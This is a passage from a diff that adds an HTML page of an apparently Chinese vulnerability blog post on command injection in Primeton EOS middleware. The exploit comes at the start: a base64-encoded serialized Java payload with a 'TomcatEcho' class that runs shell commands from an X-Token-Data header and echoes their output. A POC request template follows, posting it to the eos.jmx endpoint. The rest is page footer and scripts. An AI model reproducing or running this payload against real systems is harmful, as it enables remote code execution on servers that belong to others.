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&rdquo;)
+requests:</li>
+<li>method: POST
+timeout: 10
+path: /workspace/frame/permission/common/eos.jmx
+headers:
+Content-Type: text/plain
+X-Token-Data: &lsquo;{{command}}&rsquo;
+data: &lsquo;{{baseDATA}}&rsquo;
+follow_redirects: true
+matches: code.eq(&ldquo;200&rdquo;)
+result: &lsquo;{{body}}&rsquo;</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-12-08</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/%E6%99%AE%E5%85%83eos%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://example.org/%E6%99%AE%E5%85%83eos%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-title="普元EOS中间件存在命令注入漏洞" data-via="xxxx" data-hashtags="2023hw"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/%E6%99%AE%E5%85%83eos%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-hashtag="2023hw"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://example.org/%E6%99%AE%E5%85%83eos%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-title="普元EOS中间件存在命令注入漏洞"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://example.org/%E6%99%AE%E5%85%83eos%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-title="普元EOS中间件存在命令注入漏洞"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://example.org/%E6%99%AE%E5%85%83eos%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-title="普元EOS中间件存在命令注入漏洞"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/2023hw/">2023hw</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/%E6%99%BA%E6%85%A7%E6%A0%A1%E5%9B%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="prev" rel="prev" title="智慧校园管理系统 前台任意文件上传漏洞"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>智慧校园管理系统 前台任意文件上传漏洞</a>
+            <a href="/%E6%98%93%E6%80%9D%E8%BD%AF%E4%BB%B6-%E6%99%BA%E8%83%BD%E7%89%A9%E6%B5%81%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E7%B3%BB%E7%BB%9F-importreport-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="next" rel="next" title="易思软件-智能物流无人值守系统 ImportReport 任意文件上传">易思软件-智能物流无人值守系统 ImportReport 任意文件上传<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Chinchin</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/index.umd.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"data":{"id-1":"首页","id-2":"首页"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
